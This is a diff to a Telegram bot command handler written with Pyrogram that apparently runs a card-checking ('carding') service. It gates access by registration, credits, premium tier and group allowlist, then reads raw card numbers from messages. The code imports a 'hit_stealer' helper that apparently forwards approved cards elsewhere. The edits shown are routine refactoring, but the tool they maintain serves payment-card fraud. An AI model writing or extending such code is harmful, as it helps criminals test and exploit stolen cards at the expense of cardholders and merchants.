@@ -1,5 +1,6 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram.enums import ChatType
 import requests, re, time
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
@@ -12,10 +13,9 @@ async def cmd_b3(Client, message):
     try:
         user_id = str(message.from_user.id)
         chat_id = message.chat.id
-        chat_type = str(message.chat.type)
+        chat_type = message.chat.type
         username = message.from_user.username or "None"
 
-        # Must be registered
         regdata = fetchinfo(user_id)
         if not regdata:
             return await message.reply("❌ You are not registered. Use /register first.", quote=True)
@@ -26,11 +26,10 @@ async def cmd_b3(Client, message):
         antispam_time = int(regdata[7] or 0)
         now = int(time.time())
 
-        # Block FREE users in PM
-        if chat_type == "ChatType.PRIVATE" and role == "FREE":
+        if chat_type == ChatType.PRIVATE and role == "FREE":
             return await message.reply_text(
                 "⚠️ <b>Premium Users Required</b>\n"
-                "Only PREMIUM users can use this command in bot PM.\n"
+                "Only Premium users can use this command in bot PM.\n"
                 "Join our group to use it for FREE:",
                 reply_markup=InlineKeyboardMarkup([
                     [InlineKeyboardButton("Join Group", url="https://t.me/BarryxChat")]
@@ -38,9 +37,8 @@ async def cmd_b3(Client, message):
                 disable_web_page_preview=True
             )
 
-        # Group allowlist check
         GROUP = open("plugins/group.txt").read().splitlines()
-        if chat_type in ["ChatType.GROUP", "ChatType.SUPERGROUP"] and str(chat_id) not in GROUP:
+        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
             return await message.reply("❌ Unauthorized group. Contact admin.", quote=True)
 
         if credit < 1:
@@ -49,10 +47,9 @@ async def cmd_b3(Client, message):
         if now - antispam_time < wait_time:
             return await message.reply(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s", quote=True)
 
-        # Card input
         cc_raw = None
-        if message.reply_to_message and message.reply_to_message.text:
-            cc_raw = message.reply_to_message.text.strip()
+        if message.reply_to_message:
+            cc_raw = (message.reply_to_message.text or message.reply_to_message.caption or "").strip()
         elif len(message.text.split(maxsplit=1)) > 1:
             cc_raw = message.text.split(maxsplit=1)[1].strip()
 
